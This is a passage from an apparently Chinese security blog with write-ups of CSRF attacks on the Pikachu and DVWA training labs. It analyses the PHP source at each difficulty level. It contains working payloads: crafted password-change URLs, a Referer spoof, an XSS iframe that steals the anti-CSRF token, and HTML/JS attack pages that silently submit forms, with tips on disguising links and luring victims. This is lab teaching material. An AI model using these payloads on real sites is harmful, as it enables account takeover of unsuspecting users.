<li>构造一个url：<a href="http://192.168.0.108/pikachu/vul/csrf/csrftoken/token_get_edit.php?sex=boy&amp;phonenum=18626545453&amp;add=china&amp;email=vince%40pikachu.cn&amp;token=698085e82ed2acb762985707895&amp;submit=submit#" target="_blank" rel="noopener">http://192.168.0.108/pikachu/vul/csrf/csrftoken/token_get_edit.php?sex=boy&amp;phonenum=18626545453&amp;add=china&amp;email=vince%40pikachu.cn&amp;token=698085e82ed2acb762985707895&amp;submit=submit#</a></li>
</ul>
<p><img src="/images/csrf/pikachu/csrf-token-pikachu.png" alt="csrf-token-pikachu"></p>
<ul>
<li>成功修改</li>
<li>同样的，也能引用婷婷哈大佬的js代码文件去进行CSRF攻击</li>
</ul>
<h4 id="4-靶场说明"><a href="#4-靶场说明" class="headerlink" title="4. 靶场说明"></a>4. 靶场说明</h4><ul>
<li>pikachu的CSRF靶场还是相对容易的</li>
<li>无论是对于Referer头还是Token，都有一定的绕过方法</li>
<li>但更安全的是，验证当前的密码而不是Cookie</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/CSRF%E9%9D%B6%E5%9C%BA--dvwa/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/02/CSRF%E9%9D%B6%E5%9C%BA--dvwa/" itemprop="url">CSRF靶场--dvwa</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T16:08:22+08:00">
                2020-04-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CSRF/" itemprop="url" rel="index">
                    <span itemprop="name">CSRF</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  2.5k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  12 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-CSRF-Low"><a href="#1-CSRF-Low" class="headerlink" title="1. CSRF(Low)"></a>1. CSRF(Low)</h4><ul>
<li>发现没有确认码、输入当前密码以及Token</li>
<li>密码的传输也只通过URL传输</li>
<li>可以很容易的构造payload：<a href="http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=test&amp;password_conf=test&amp;Change=Change#" target="_blank" rel="noopener">http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=test&amp;password_conf=test&amp;Change=Change#</a></li>
<li>源码分析<ul>
<li>首先获取输入的两个密码然后判断两个值是否相等</li>
<li>若相等则接着对pass_new变量进行调用mysql_real_escape_string()函数来进行字符串的过滤</li>
<li>再调用md5()函数对输入的密码进行MD5加密</li>
<li>最后再将新密码更新到数据库中</li>
<li>▲ 整段代码因为调用了mysql_real_escape_string()函数从而有效地过滤了SQL注入，但是对CSRF没有任何的防御机制</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &apos;Change&apos; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $pass_new  = $_GET[ &apos;password_new&apos; ];</span><br><span class="line">    $pass_conf = $_GET[ &apos;password_conf&apos; ];</span><br><span class="line"></span><br><span class="line">    // Do the passwords match?</span><br><span class="line">    if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        // They do!</span><br><span class="line">        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        // Update the database</span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;</span><br><span class="line">        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">        // Feedback for the user</span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Issue with passwords matching</span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="2-CSRF-Medium"><a href="#2-CSRF-Medium" class="headerlink" title="2. CSRF(Medium)"></a>2. CSRF(Medium)</h4><ul>
<li>先改变账号的密码test123，发现没问题</li>
<li>尝试用一下Low级别的payload：<a href="http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=test&amp;password_conf=test&amp;Change=Change#" target="_blank" rel="noopener">http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=test&amp;password_conf=test&amp;Change=Change#</a></li>
<li>发现弹出错误</li>
</ul>
<p><img src="/images/csrf/dvwa/csrf-http_referer.png" alt="csrf-http_referer"></p>
<ul>
<li>F12打开网络，查看消息头，发现Referer是一个网络地址</li>
</ul>
<p><img src="/images/csrf/dvwa/csrf-network.png" alt="csrf-network"></p>
<ul>
<li>打开Burpsuite，抓取一个请求包，往请求头里面添加一个Referer，Referer头内容为Host字段内容，即可看到修改密码成功<ul>
<li>▲ 2020.03.31 HackBar尝试失败，无法正常带上一个Referer</li>
<li>▲ 127.0.0.1的Referer头无法修改密码</li>
</ul>
</li>
</ul>
<p><img src="/images/csrf/dvwa/csrf-bp.png" alt="csrf-bp"></p>
<ul>
<li>源码分析<ul>
<li>在Low级别的基础上，添加了对Referer头的判断，是否包含了Host字段的内容</li>
<li>HTTP_REFERER与SERVER_NAME的stripos()函数判断</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &apos;Change&apos; ] ) ) &#123;</span><br><span class="line">    // Checks to see where the request came from</span><br><span class="line">    if( stripos( $_SERVER[ &apos;HTTP_REFERER&apos; ] ,$_SERVER[ &apos;SERVER_NAME&apos; ]) !== false ) &#123;</span><br><span class="line">        // Get input</span><br><span class="line">        $pass_new  = $_GET[ &apos;password_new&apos; ];</span><br><span class="line">        $pass_conf = $_GET[ &apos;password_conf&apos; ];</span><br><span class="line"></span><br><span class="line">        // Do the passwords match?</span><br><span class="line">        if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            // They do!</span><br><span class="line">            $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            // Update the database</span><br><span class="line">            $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;</span><br><span class="line">            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">            // Feedback for the user</span><br><span class="line">            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // Issue with passwords matching</span><br><span class="line">            echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Didn&apos;t come from a trusted source</span><br><span class="line">        echo &quot;&lt;pre&gt;That request didn&apos;t look correct.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="3-CSRF-High"><a href="#3-CSRF-High" class="headerlink" title="3. CSRF(High)"></a>3. CSRF(High)</h4><ul>
<li>先改变账号的密码test123，发现URL地址中多出了一个user_token：<a href="http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=test123&amp;password_conf=test123&amp;Change=Change&amp;user_token=87d4d22790311704b656dff9308ec73a#" target="_blank" rel="noopener">http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=test123&amp;password_conf=test123&amp;Change=Change&amp;user_token=87d4d22790311704b656dff9308ec73a#</a></li>
<li>且每次修改密码，token都会发生变化，暂时无法破解</li>
<li>▲ 以下答案来自婷婷哈大佬的解题–CSRF结合XSS漏洞<ul>
<li>要绕过High级别的反CSRF机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token，试着去构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击</li>
<li>攻击思路<ul>
<li>当受害者点击进入这个页面，脚本会通过一个看不见框架偷偷访问修改密码的页面，获取页面中的token，并向服务器发送改密请求，以完成CSRF攻击</li>
<li>▲ 然而现实中有跨域问题，而现在的浏览器是不允许跨域请求的，只能将击代码注入到目标服务器中，才有可能完成攻击</li>
</ul>
</li>
</ul>
</li>
<li>攻击实现<ul>
<li>找到一个有XSS漏洞的站点，这里选择XSS(stored)（同源站点，不然受同源策略影响）</li>
<li>在name中修改maxlength的长度，并注入能利用的代码： <code>&lt;iframe src=&quot;../csrf&quot;&gt;</code></li>
<li>提交后会返回一个包含csrf的页面，里面有存在user_token的值：d915919e613a4e8f9f1ab750f23571f0</li>
<li>构造payload：<a href="http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change&amp;user_token=d915919e613a4e8f9f1ab750f23571f0#" target="_blank" rel="noopener">http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change&amp;user_token=d915919e613a4e8f9f1ab750f23571f0#</a></li>
<li>成功修改密码</li>
<li>▲ 也可用此代码：<code>&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElenentsByName(&#39;user_token&#39;)[0].value)&gt;</code></li>
</ul>
</li>
</ul>
<p><img src="/images/csrf/dvwa/csrf-token-dvwa.png" alt="csrf-token-dvwa"></p>
<ul>
<li>下面为婷婷哈大佬写的js文件，用于修改密码，在这基础上，将js文件在XSS平台编辑，然后找到一个有XSS漏洞的站点，修改URL发给受害者</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function attack()&#123;</span><br><span class="line"></span><br><span class="line">    document.getElementsByName(&apos;user_token&apos;)[0].value=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(&apos;user_token&apos;)[0].value;</span><br><span class="line"></span><br><span class="line">    document.getElementById(&quot;transfer&quot;).submit();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;http://192.168.0.109/dvwa/vulnerabilities/csrf&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display:none;&quot;&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onload=&quot;attack()&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://192.168.0.109/dvwa/vulnerabilities/csrf&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>源码分析<ul>
<li>在Low级别的基础上，增加了对Session中session_token的判断，且一次随机性</li>
<li>High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &apos;Change&apos; ] ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $pass_new  = $_GET[ &apos;password_new&apos; ];</span><br><span class="line">    $pass_conf = $_GET[ &apos;password_conf&apos; ];</span><br><span class="line"></span><br><span class="line">    // Do the passwords match?</span><br><span class="line">    if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        // They do!</span><br><span class="line">        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        // Update the database</span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;</span><br><span class="line">        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">        // Feedback for the user</span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Issue with passwords matching</span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="4-CSRF-Impossible"><a href="#4-CSRF-Impossible" class="headerlink" title="4. CSRF(Impossible)"></a>4. CSRF(Impossible)</h4><ul>
<li>impossible级修改密码的界面是需要通过三次输入，即增加了输入当前密码的项，从而能够进行相应的身份认证</li>
<li>源码分析<ul>
<li>增加了一个对当前密码的确认，基本无绕过方式（▲ 你知道密码了还改个锤子）</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &apos;Change&apos; ] ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $pass_curr = $_GET[ &apos;password_current&apos; ];</span><br><span class="line">    $pass_new  = $_GET[ &apos;password_new&apos; ];</span><br><span class="line">    $pass_conf = $_GET[ &apos;password_conf&apos; ];</span><br><span class="line"></span><br><span class="line">    // Sanitise current password input</span><br><span class="line">    $pass_curr = stripslashes( $pass_curr );</span><br><span class="line">    $pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $pass_curr = md5( $pass_curr );</span><br><span class="line"></span><br><span class="line">    // Check that the current password is correct</span><br><span class="line">    $data = $db-&gt;prepare( &apos;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; );</span><br><span class="line">    $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;bindParam( &apos;:password&apos;, $pass_curr, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">    // Do both new passwords match and does the current password match the user?</span><br><span class="line">    if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) &#123;</span><br><span class="line">        // It does!</span><br><span class="line">        $pass_new = stripslashes( $pass_new );</span><br><span class="line">        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        // Update database with new password</span><br><span class="line">        $data = $db-&gt;prepare( &apos;UPDATE users SET password = (:password) WHERE user = (:user);&apos; );</span><br><span class="line">        $data-&gt;bindParam( &apos;:password&apos;, $pass_new, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">        // Feedback for the user</span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Issue with passwords matching</span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="5-CSRF的三种payload形式"><a href="#5-CSRF的三种payload形式" class="headerlink" title="5. CSRF的三种payload形式"></a>5. CSRF的三种payload形式</h4><ul>
<li>▲ 本节内容来自部分来自婷婷哈大佬和部分来自bmjoker大佬</li>
<li>构造链接 <ul>
<li><a href="http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=test&amp;password_conf=test&amp;Change=Change#" target="_blank" rel="noopener">http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=test&amp;password_conf=test&amp;Change=Change#</a></li>
<li>当受害者点击了这个链接，他的密码就会被改成test</li>
<li>▲ CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面</li>
</ul>
</li>
<li>使用短链接来隐藏URL<ul>
<li>如<a href="http://dwz.cn/" target="_blank" rel="noopener">http://dwz.cn/</a>….</li>
<li>实际攻击场景下只要目标服务器的域名不是ip，是可以生成相应短链接的.</li>
<li>但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也不适合现实生活</li>
</ul>
</li>
<li>构造攻击页面<ul>
<li>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成</li>
<li>当受害者访问攻击页面时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改了</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;http://127.0.0.1/DVWA/vulnerabilities/csrf/&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;hacker&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;hacker&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;Click Me&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="6-靶场说明"><a href="#6-靶场说明" class="headerlink" title="6. 靶场说明"></a>6. 靶场说明</h4><ul>
<li>dvwa的CSRF靶场是相对容易的</li>
<li>无论是对于Referer头还是Token，都有一定的绕过方法</li>
<li>但更安全的是，验证当前的密码而不是Cookie</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/XSS--%E6%89%8B%E5%B7%A5%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95%E8%AE%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/02/XSS--%E6%89%8B%E5%B7%A5%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95%E8%AE%BA/" itemprop="url">XSS--手工挖掘方法论</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T16:01:27+08:00">
                2020-04-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
